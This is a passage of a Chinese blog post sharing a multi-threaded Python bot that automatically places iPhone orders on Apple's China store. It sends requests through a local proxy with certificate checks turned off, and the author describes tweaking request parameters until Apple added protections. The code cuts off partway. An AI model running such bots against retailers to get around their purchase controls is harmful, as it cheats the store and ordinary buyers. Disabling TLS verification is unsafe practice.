alt=\"\"></p>\n<h2 id=\"记录总结一下-付出总会有收获\"><a href=\"#记录总结一下-付出总会有收获\" class=\"headerlink\" title=\"记录总结一下 | 付出总会有收获\"></a>记录总结一下 | 付出总会有收获</h2><p>几天过去了，今天回过头来稍微整理下，记录下来，好歹也付出过不是？</p>\n<p>今天再次查看苹果网站，之前修改的参数点现在又修改回去了。不过在最后的下订单环节应该有增加了一些防护，所以我的脚本还是不能用。</p>\n<hr>\n<ul>\n<li>python可以直接读取json文件转换为dict.非常好用！</li>\n<li><p>用datetime库来判断时间点：</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">tmp= datetime.datetime(<span class=\"number\">2017</span>,<span class=\"number\">10</span>,<span class=\"number\">27</span>,<span class=\"number\">6</span>,<span class=\"number\">58</span>).timestamp()-time.timezone - datetime.datetime.now().timestamp()</div><div class=\"line\"><span class=\"keyword\">if</span> tmp&gt;<span class=\"number\">0</span>:  <span class=\"comment\"># UTC时间！   </span></div><div class=\"line\">    print(orderIdentify+<span class=\"string\">\"🤕\\tiphone X 尚未起售！ == %d minutes ==\"</span>%(tmp/<span class=\"number\">60</span>))</div><div class=\"line\">    <span class=\"keyword\">return</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>使用requests.session类来处理多步骤的请求，可以自动处理cookie问题，自动重试功能也非常赞！</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">session=requests.session()      <span class=\"comment\"># session会话可以自动保存和处理cookie</span></div><div class=\"line\">session.proxies=proxies</div><div class=\"line\">session.verify=<span class=\"keyword\">False</span></div><div class=\"line\">session.timeout=<span class=\"number\">30</span>          <span class=\"comment\"># 此处设置timeout无用</span></div><div class=\"line\">session.headers=&#123;<span class=\"string\">'User-Agent'</span>:userAgent&#125;</div><div class=\"line\"><span class=\"comment\"># https://stackoverflow.com/questions/15431044/can-i-set-max-retries-for-requests-request/</span></div><div class=\"line\">session.mount(<span class=\"string\">'https://'</span>, requests.adapters.HTTPAdapter(max_retries=retryTime<span class=\"number\">-1</span>))     <span class=\"comment\"># 实际会重试 max_retries +1 次   所以将retry次数先减1</span></div><div class=\"line\">session.mount(<span class=\"string\">'http://'</span>, requests.adapters.HTTPAdapter(max_retries=retryTime<span class=\"number\">-1</span>))</div></pre></td></tr></table></figure>\n</li>\n<li><p>也许直接使用浏览器模拟器是更好的选择（如mechanize selenium），虽然“重”了些，但简单易处理。</p>\n</li>\n</ul>\n<h2 id=\"上代码-感兴趣的拿走不谢\"><a href=\"#上代码-感兴趣的拿走不谢\" class=\"headerlink\" title=\"上代码 | 感兴趣的拿走不谢\"></a>上代码 | 感兴趣的拿走不谢</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div><div class=\"line\">247</div><div class=\"line\">248</div><div class=\"line\">249</div><div class=\"line\">250</div><div class=\"line\">251</div><div class=\"line\">252</div><div class=\"line\">253</div><div class=\"line\">254</div><div class=\"line\">255</div><div class=\"line\">256</div><div class=\"line\">257</div><div class=\"line\">258</div><div class=\"line\">259</div><div class=\"line\">260</div><div class=\"line\">261</div><div class=\"line\">262</div><div class=\"line\">263</div><div class=\"line\">264</div><div class=\"line\">265</div><div class=\"line\">266</div><div class=\"line\">267</div><div class=\"line\">268</div><div class=\"line\">269</div><div class=\"line\">270</div><div class=\"line\">271</div><div class=\"line\">272</div><div class=\"line\">273</div><div class=\"line\">274</div><div class=\"line\">275</div><div class=\"line\">276</div><div class=\"line\">277</div><div class=\"line\">278</div><div class=\"line\">279</div><div class=\"line\">280</div><div class=\"line\">281</div><div class=\"line\">282</div><div class=\"line\">283</div><div class=\"line\">284</div><div class=\"line\">285</div><div class=\"line\">286</div><div class=\"line\">287</div><div class=\"line\">288</div><div class=\"line\">289</div><div class=\"line\">290</div><div class=\"line\">291</div><div class=\"line\">292</div><div class=\"line\">293</div><div class=\"line\">294</div><div class=\"line\">295</div><div class=\"line\">296</div><div class=\"line\">297</div><div class=\"line\">298</div><div class=\"line\">299</div><div class=\"line\">300</div><div class=\"line\">301</div><div class=\"line\">302</div><div class=\"line\">303</div><div class=\"line\">304</div><div class=\"line\">305</div><div class=\"line\">306</div><div class=\"line\">307</div><div class=\"line\">308</div><div class=\"line\">309</div><div class=\"line\">310</div><div class=\"line\">311</div><div class=\"line\">312</div><div class=\"line\">313</div><div class=\"line\">314</div><div class=\"line\">315</div><div class=\"line\">316</div><div class=\"line\">317</div><div class=\"line\">318</div><div class=\"line\">319</div><div class=\"line\">320</div><div class=\"line\">321</div><div class=\"line\">322</div><div class=\"line\">323</div><div class=\"line\">324</div><div class=\"line\">325</div><div class=\"line\">326</div><div class=\"line\">327</div><div class=\"line\">328</div><div class=\"line\">329</div><div class=\"line\">330</div><div class=\"line\">331</div><div class=\"line\">332</div><div class=\"line\">333</div><div class=\"line\">334</div><div class=\"line\">335</div><div class=\"line\">336</div><div class=\"line\">337</div><div class=\"line\">338</div><div class=\"line\">339</div><div class=\"line\">340</div><div class=\"line\">341</div><div class=\"line\">342</div><div class=\"line\">343</div><div class=\"line\">344</div><div class=\"line\">345</div><div class=\"line\">346</div><div class=\"line\">347</div><div class=\"line\">348</div><div class=\"line\">349</div><div class=\"line\">350</div><div class=\"line\">351</div><div class=\"line\">352</div><div class=\"line\">353</div><div class=\"line\">354</div><div class=\"line\">355</div><div class=\"line\">356</div><div class=\"line\">357</div><div class=\"line\">358</div><div class=\"line\">359</div><div class=\"line\">360</div><div class=\"line\">361</div><div class=\"line\">362</div><div class=\"line\">363</div><div class=\"line\">364</div><div class=\"line\">365</div><div class=\"line\">366</div><div class=\"line\">367</div><div class=\"line\">368</div><div class=\"line\">369</div><div class=\"line\">370</div><div class=\"line\">371</div><div class=\"line\">372</div><div class=\"line\">373</div><div class=\"line\">374</div><div class=\"line\">375</div><div class=\"line\">376</div><div class=\"line\">377</div><div class=\"line\">378</div><div class=\"line\">379</div><div class=\"line\">380</div><div class=\"line\">381</div><div class=\"line\">382</div><div class=\"line\">383</div><div class=\"line\">384</div><div class=\"line\">385</div><div class=\"line\">386</div><div class=\"line\">387</div><div class=\"line\">388</div><div class=\"line\">389</div><div class=\"line\">390</div><div class=\"line\">391</div><div class=\"line\">392</div><div class=\"line\">393</div><div class=\"line\">394</div><div class=\"line\">395</div><div class=\"line\">396</div><div class=\"line\">397</div><div class=\"line\">398</div><div class=\"line\">399</div><div class=\"line\">400</div><div class=\"line\">401</div><div class=\"line\">402</div><div class=\"line\">403</div><div class=\"line\">404</div><div class=\"line\">405</div><div class=\"line\">406</div><div class=\"line\">407</div><div class=\"line\">408</div><div class=\"line\">409</div><div class=\"line\">410</div><div class=\"line\">411</div><div class=\"line\">412</div><div class=\"line\">413</div><div class=\"line\">414</div><div class=\"line\">415</div><div class=\"line\">416</div><div class=\"line\">417</div><div class=\"line\">418</div><div class=\"line\">419</div><div class=\"line\">420</div><div class=\"line\">421</div><div class=\"line\">422</div><div class=\"line\">423</div><div class=\"line\">424</div><div class=\"line\">425</div><div class=\"line\">426</div><div class=\"line\">427</div><div class=\"line\">428</div><div class=\"line\">429</div><div class=\"line\">430</div><div class=\"line\">431</div><div class=\"line\">432</div><div class=\"line\">433</div><div class=\"line\">434</div><div class=\"line\">435</div><div class=\"line\">436</div><div class=\"line\">437</div><div class=\"line\">438</div><div class=\"line\">439</div><div class=\"line\">440</div><div class=\"line\">441</div><div class=\"line\">442</div><div class=\"line\">443</div><div class=\"line\">444</div><div class=\"line\">445</div><div class=\"line\">446</div><div class=\"line\">447</div><div class=\"line\">448</div><div class=\"line\">449</div><div class=\"line\">450</div><div class=\"line\">451</div><div class=\"line\">452</div><div class=\"line\">453</div><div class=\"line\">454</div><div class=\"line\">455</div><div class=\"line\">456</div><div class=\"line\">457</div><div class=\"line\">458</div><div class=\"line\">459</div><div class=\"line\">460</div><div class=\"line\">461</div><div class=\"line\">462</div><div class=\"line\">463</div><div class=\"line\">464</div><div class=\"line\">465</div><div class=\"line\">466</div><div class=\"line\">467</div><div class=\"line\">468</div><div class=\"line\">469</div><div class=\"line\">470</div><div class=\"line\">471</div><div class=\"line\">472</div><div class=\"line\">473</div><div class=\"line\">474</div><div class=\"line\">475</div><div class=\"line\">476</div><div class=\"line\">477</div><div class=\"line\">478</div><div class=\"line\">479</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"><span class=\"comment\"># Author : Mr.Bingo</span></div><div class=\"line\"><span class=\"comment\"># Version : 2.0</span></div><div class=\"line\"><span class=\"comment\"># Description : </span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> pdb</div><div class=\"line\"><span class=\"keyword\">import</span> requests</div><div class=\"line\"><span class=\"keyword\">import</span> logging</div><div class=\"line\"><span class=\"keyword\">import</span> json</div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> re</div><div class=\"line\"><span class=\"keyword\">import</span> threading</div><div class=\"line\"><span class=\"keyword\">import</span> datetime,time</div><div class=\"line\"><span class=\"keyword\">from</span> requests.packages.urllib3.exceptions <span class=\"keyword\">import</span> InsecureRequestWarning</div><div class=\"line\"></div><div class=\"line\">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</div><div class=\"line\"></div><div class=\"line\">logging.basicConfig(level=logging.INFO)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#orderPath= os.path.join(os.path.split(os.path.abspath(__file__))[0],u'order')     # json文件格式订单</span></div><div class=\"line\">orderFile= os.path.join(os.path.split(os.path.abspath(__file__))[<span class=\"number\">0</span>],<span class=\"string\">'order.txt'</span>)    <span class=\"comment\"># txt订单格式</span></div><div class=\"line\"><span class=\"comment\">#   lastName | firstName | phone | email | state | city | district | street | payment | product | color | capacity | quantity</span></div><div class=\"line\"><span class=\"comment\">#   邓 | 六 | 15000555000 | test3@oddboy.cn | 北京 | 北京 | 海淀区 | XXX路17号 | Alipay | iphone8 | glod | 256gb | 2</span></div><div class=\"line\">orderResult = os.path.join(os.path.split(os.path.abspath(__file__))[<span class=\"number\">0</span>],<span class=\"string\">'order-Result.csv'</span>)  <span class=\"comment\"># 成功订单</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># orderSuccess = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Success.txt')  # 成功订单</span></div><div class=\"line\"><span class=\"comment\"># orderFail = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Fail.txt')  # 失败订单</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">iPhoneBuyer</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    <span class=\"comment\"># 初始化</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        self.dispData=[]    <span class=\"comment\"># list</span></div><div class=\"line\">        self.threadLock = threading.Lock()  <span class=\"comment\"># 进程锁，主要用于写文件！</span></div><div class=\"line\">        <span class=\"keyword\">pass</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># 多线程情况下美化，格式化输出消息。</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">pass</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># 开启多线程 一个订单一个线程</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_Threads</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        thread_arr=[]       <span class=\"comment\"># 线程列表</span></div><div class=\"line\">        threading.Thread(target=self.display)     </div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\"># json文件格式订单读取</span></div><div class=\"line\">        <span class=\"comment\"># logging.info(\"\\r[info] Order Path : %s \"%orderPath[:80])</span></div><div class=\"line\">        <span class=\"comment\"># for dirpath,dirname,files in os.walk(orderPath):</span></div><div class=\"line\">        <span class=\"comment\">#     print(files)</span></div><div class=\"line\">        <span class=\"comment\">#     for f in files:</span></div><div class=\"line\">        <span class=\"comment\">#         if re.match(r'^order.*\\.json$',f):</span></div><div class=\"line\">        <span class=\"comment\">#             f=os.path.join(orderPath,f)</span></div><div class=\"line\">        <span class=\"comment\">#             logging.info(f)</span></div><div class=\"line\">        <span class=\"comment\">#             with open(f,encoding='utf-8') as fp:</span></div><div class=\"line\">        <span class=\"comment\">#                 order=json.load(fp)</span></div><div class=\"line\">        <span class=\"comment\">#                 order['fileFullName']= f</span></div><div class=\"line\">        <span class=\"comment\">#                 logging.debug(order)</span></div><div class=\"line\">        <span class=\"comment\">#                 print(\"\\n&gt; order's phone :: \"+order['phone'])</span></div><div class=\"line\">        <span class=\"comment\">#                 #pdb.set_trace()</span></div><div class=\"line\">        <span class=\"comment\">#                 t=threading.Thread(target=self.buy,args=(order,))</span></div><div class=\"line\">        <span class=\"comment\">#                 thread_arr.append(t)</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(orderFile):</div><div class=\"line\">            print(<span class=\"string\">\"没有订单文件！！！\"</span>)</div><div class=\"line\">            sys.exit(<span class=\"number\">0</span>)</div><div class=\"line\">        </div><div class=\"line\">        <span class=\"keyword\">with</span> open(orderFile,encoding=<span class=\"string\">'utf-8'</span>) <span class=\"keyword\">as</span> fp:</div><div class=\"line\">            raw_orders = fp.readlines()</div><div class=\"line\">            tmp = <span class=\"keyword\">False</span></div><div class=\"line\">            <span class=\"keyword\">for</span> raw_order <span class=\"keyword\">in</span> raw_orders:</div><div class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> tmp:</div><div class=\"line\">                    tmp =<span class=\"keyword\">True</span></div><div class=\"line\">                    <span class=\"keyword\">continue</span>    <span class=\"comment\"># 跳过order.txt文件的第一行</span></div><div class=\"line\">              </div><div class=\"line\">                raw_order = str(raw_order).replace(<span class=\"string\">' '</span>,<span class=\"string\">''</span>)  <span class=\"comment\"># 删除所有空格</span></div><div class=\"line\">                logging.debug(raw_order)</div><div class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> re.match(<span class=\"string\">r'^((.*?\\|)&#123;13&#125;)'</span>,raw_order):      <span class=\"comment\"># 简单检查订单格式</span></div><div class=\"line\">                    <span class=\"keyword\">continue</span></div><div class=\"line\">                l = raw_order.split(<span class=\"string\">\"|\"</span>)</div><div class=\"line\">                order=&#123;&#125;</div><div class=\"line\">                order[<span class=\"string\">'lastName'</span>] = l[<span class=\"number\">0</span>]</div><div class=\"line\">                order[<span class=\"string\">'firstName'</span>] = l[<span class=\"number\">1</span>]</div><div class=\"line\">                order[<span class=\"string\">'phone'</span>] = l[<span class=\"number\">2</span>]</div><div class=\"line\">                order[<span class=\"string\">'email'</span>] = l[<span class=\"number\">3</span>]</div><div class=\"line\">                order[<span class=\"string\">'state'</span>] = l[<span class=\"number\">4</span>]</div><div class=\"line\">                order[<span class=\"string\">'city'</span>] = l[<span class=\"number\">5</span>]</div><div class=\"line\">                order[<span class=\"string\">'district'</span>] = l[<span class=\"number\">6</span>]</div><div class=\"line\">                order[<span class=\"string\">'street'</span>] = l[<span class=\"number\">7</span>]</div><div class=\"line\">                order[<span class=\"string\">'payment'</span>] = l[<span class=\"number\">8</span>]</div><div class=\"line\">                order[<span class=\"string\">'product'</span>] = l[<span class=\"number\">9</span>]</div><div class=\"line\">                order[<span class=\"string\">'color'</span>] = l[<span class=\"number\">10</span>]</div><div class=\"line\">                order[<span class=\"string\">'capacity'</span>] = l[<span class=\"number\">11</span>]</div><div class=\"line\">                order[<span class=\"string\">'quantity'</span>] = l[<span class=\"number\">12</span>]</div><div class=\"line\">                logging.debug(order)</div><div class=\"line\">                t=threading.Thread(target=self.buy,args=(order,))</div><div class=\"line\">                thread_arr.append(t)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> range(len(thread_arr)):</div><div class=\"line\">            thread_arr[t].start()       <span class=\"comment\"># 启动线程。         </span></div><div class=\"line\">        </div><div class=\"line\">        <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> range(len(thread_arr)):</div><div class=\"line\">            thread_arr[t].join()        <span class=\"comment\"># 收拢</span></div><div class=\"line\">        <span class=\"keyword\">pass</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># 处理购买</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">buy</span><span class=\"params\">(self,order)</span>:</span></div><div class=\"line\">        retryTime = <span class=\"number\">5</span>       <span class=\"comment\"># 请求失败后重试次数</span></div><div class=\"line\">        retryTimeout = <span class=\"number\">30</span>     <span class=\"comment\"># 全局超时时间</span></div><div class=\"line\">        orderIdentify = order[<span class=\"string\">'lastName'</span>]+order[<span class=\"string\">'firstName'</span>]+<span class=\"string\">\"&lt;\"</span>+order[<span class=\"string\">'product'</span>]+<span class=\"string\">\"/\"</span>+ order[<span class=\"string\">'color'</span>]+<span class=\"string\">\"/\"</span>+order[<span class=\"string\">'capacity'</span>]+<span class=\"string\">\"&gt; || \"</span></div><div class=\"line\">        <span class=\"comment\"># n = 0         # 测试代码</span></div><div class=\"line\">        <span class=\"comment\"># while n &lt; 5:</span></div><div class=\"line\">        <span class=\"comment\">#     print(threading.current_thread().name)</span></div><div class=\"line\">        <span class=\"comment\">#     n = n + 1</span></div><div class=\"line\">        <span class=\"comment\">#     time.sleep(1)</span></div><div class=\"line\">        <span class=\"comment\"># return </span></div><div class=\"line\">        userAgent=<span class=\"string\">\"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)\"</span>   <span class=\"comment\"># aywysya可能需要与此值匹配。</span></div><div class=\"line\">        cookies=&#123;&#125;</div><div class=\"line\">        proxies=&#123;</div><div class=\"line\">            <span class=\"string\">\"http\"</span>: <span class=\"string\">\"http://127.0.0.1:8080\"</span>,     <span class=\"comment\"># 本地监听</span></div><div class=\"line\">            <span class=\"string\">\"https\"</span>: <span class=\"string\">\"https://127.0.0.1:8080\"</span></div><div class=\"line\">        &#125;</div><div class=\"line\">        print(<span class=\"string\">'order :: '</span>+order[<span class=\"string\">'lastName'</span>]+order[<span class=\"string\">'firstName'</span>]+<span class=\"string\">\"\\t\"</span>+order[<span class=\"string\">'email'</span>]+<span class=\"string\">\"\\t%15s\\t%15s\\t%15s\"</span>%(order[<span class=\"string\">'product'</span>],order[<span class=\"string\">'capacity'</span>],order[<span class=\"string\">'color'</span>]) )</div><div class=\"line\">        time.sleep(<span class=\"number\">0.5</span>)</div><div class=\"line\">        <span class=\"keyword\">if</span> order[<span class=\"string\">'product'</span>]==<span class=\"string\">\"iphone8\"</span> <span class=\"keyword\">or</span> order[<span class=\"string\">'product'</span>]==<span class=\"string\">'iphone8plus'</span>:</div><div class=\"line\">            url=<span class=\"string\">\"https://www.apple.com/cn/shop/buy-iphone/iphone-8\"</span></div><div class=\"line\">        <span class=\"keyword\">elif</span> order[<span class=\"string\">'product'</span>]==<span class=\"string\">'iphonex'</span>:</div><div class=\"line\">            <span class=\"comment\">#if datetime.datetime.now().timestamp() &lt; datetime.datetime(2017,10,27,15,0).timestamp():    #从时间判断是否起售</span></div><div class=\"line\">            tmp= datetime.datetime(<span class=\"number\">2017</span>,<span class=\"number\">10</span>,<span class=\"number\">27</span>,<span class=\"number\">6</span>,<span class=\"number\">58</span>).timestamp()-time.timezone - datetime.datetime.now().timestamp()</div><div class=\"line\">            <span class=\"keyword\">if</span> tmp&gt;<span class=\"number\">0</span>:  <span class=\"comment\"># UTC时间！   </span></div><div class=\"line\">                print(orderIdentify+<span class=\"string\">\"🤕\\tiphone X 尚未起售！ == %d minutes ==\"</span>%(tmp/<span class=\"number\">60</span>))</div><div class=\"line\">                <span class=\"keyword\">return</span></div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                url=<span class=\"string\">\"https://www.apple.com/cn/shop/buy-iphone/iphone-x\"</span></div><div class=\"line\"></div><div class=\"line\">        session=requests.session()      <span class=\"comment\"># session会话可以自动保存和处理cookie</span></div><div class=\"line\">        session.proxies=proxies</div><div class=\"line\">        session.verify=<span class=\"keyword\">False</span></div><div class=\"line\">        session.timeout=<span class=\"number\">30</span>          <span class=\"comment\"># 此处设置timeout无用</span></div><div class=\"line\">        session.headers=&#123;<span class=\"string\">'User-Agent'</span>:userAgent&#125;</div><div class=\"line\">        <span class=\"comment\"># https://stackoverflow.com/questions/15431044/can-i-set-max-retries-for-requests-request/</span></div><div class=\"line\">        session.mount(<span class=\"string\">'https://'</span>, requests.adapters.HTTPAdapter(max_retries=retryTime<span class=\"number\">-1</span>))     <span class=\"comment\"># 实际会重试 max_retries +1 次   所以将retry次数先减1</span></div><div class=\"line\">        session.mount(<span class=\"string\">'http://'</span>, requests.adapters.HTTPAdapter(max_retries=retryTime<span class=\"number\">-1</span>))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\"># logging.debug(\"GET请求 :: %s\"%url)</span></div><div class=\"line\">        <span class=\"comment\">#r = session.get(url,timeout=reqTimeout)</span></div><div class=\"line\">        <span class=\"comment\"># logging.info(\"获得cookie :: %s\"%print(r.cookies)[:80])</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\"># 在products.json中遍历对应产品,PS:从网页获取比较麻烦。</span></div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(os.path.join(os.path.split(os.path.abspath(__file__))[<span class=\"number\">0</span>],<span class=\"string\">\"products.json\"</span>)):</div><div class=\"line\">            print(<span class=\"string\">\"\\n\\t\\tproducts.json文件不存在！\\n\"</span>)</div><div class=\"line\">            sys.exit(<span class=\"number\">0</span>)</div><div class=\"line\">        currentProduct=&#123;&#125;</div><div class=\"line\">        <span class=\"keyword\">with</span> open(os.path.join(os.path.split(os.path.abspath(__file__))[<span class=\"number\">0</span>],<span class=\"string\">\"products.json\"</span>),encoding=<span class=\"string\">'utf-8'</span>) <span class=\"keyword\">as</span> productFileHandle:    </div><div class=\"line\">            products = json.load(productFileHandle)</div><div class=\"line\">            <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> products:</div><div class=\"line\">                <span class=\"comment\">#pdb.set_trace()</span></div><div class=\"line\">                <span class=\"keyword\">if</span> p[<span class=\"string\">'productLocatorFamily'</span>]==order[<span class=\"string\">'product'</span>] <span class=\"keyword\">and</span> p[<span class=\"string\">'dimensionCapacity'</span>]==order[<span class=\"string\">'capacity'</span>] <span class=\"keyword\">and</span> p[<span class=\"string\">'dimensionColor'</span>]==order[<span class=\"string\">'color'</span>]:</div><div class=\"line\">                    logging.debug(<span class=\"string\">\"产品型号 : %s\\t%s\"</span>%(p[<span class=\"string\">'partNumber'</span>],p[<span class=\"string\">'seoUrlToken'</span>])[:<span class=\"number\">80</span>])</div><div class=\"line\">                    currentProduct=p</div><div class=\"line\">                    <span class=\"keyword\">break</span>   <span class=\"comment\"># 找到相应产品，退出for循环</span></div><div class=\"line\">            <span class=\"keyword\">if</span> len(currentProduct) == <span class=\"number\">0</span>:</div><div class=\"line\">                print(<span 